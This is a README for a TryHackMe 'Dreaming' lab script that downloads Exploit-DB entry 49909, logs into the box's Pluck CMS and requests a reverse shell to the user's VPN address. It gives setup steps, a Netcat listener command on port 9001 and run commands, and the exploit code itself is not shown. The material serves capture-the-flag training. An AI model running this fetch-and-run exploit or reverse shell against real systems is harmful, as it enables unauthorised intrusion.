# TryHackMe: Dreaming

For the authorized Dreaming lab only; see the root [usage notice](../../README.md). `webshell.py` downloads and runs Exploit-DB entry 49909, logs into the box's Pluck CMS, and requests a reverse shell to your VPN IPv4 address on TCP port **9001**.

## Requirements

- Linux, Python 3, and `ifconfig` (usually supplied by `net-tools`).
- The third-party Python package **`requests`**. Python 3 and `ifconfig` alone are not sufficient for the current code.
- An active lab VPN with a `tun0` interface and an IPv4 address visible in `ifconfig`.
- Internet access to download the exploit, connectivity to the assigned box, and a reverse-shell listener such as Netcat.
- Python 3 and `/bin/sh` on the target: the callback payload uses Unix `pty` functionality.

**Windows:** Native Windows is not supported as written: the script calls `ifconfig` and parses Linux-style `tun0` output. A Linux VM is suitable when its VPN and routing are configured. WSL is only a possible option if that Linux environment itself provides the expected interface and connectivity; a Windows-host VPN alone may not do so. Platform support is based on code inspection, not runtime testing. Tho the script can run in windows if you supply your own IP manually.

## Setup and run

From this directory, install the Python dependency, preferably in a virtual environment:

```bash
python3 -m venv .venv
source .venv/bin/activate
python3 -m pip install requests
ifconfig tun0
```

Install your distribution's `python3-venv`, `net-tools`, and Netcat packages if those commands are unavailable. Start the Dreaming box and connect the lab VPN before running the script.

In a separate terminal, start a listener (the following syntax works with OpenBSD Netcat):

```bash
nc -lvnp 9001
```

Then run the script, replacing `TARGET_IP` with the box's assigned IPv4 address:

```bash
python3 webshell.py -t TARGET_IP -p 80
```

To explicitly select a callback IPv4 address reachable from the box:

```bash
python3 webshell.py -t TARGET_IP -p 80 -H YOUR_VPN_IPV4
```
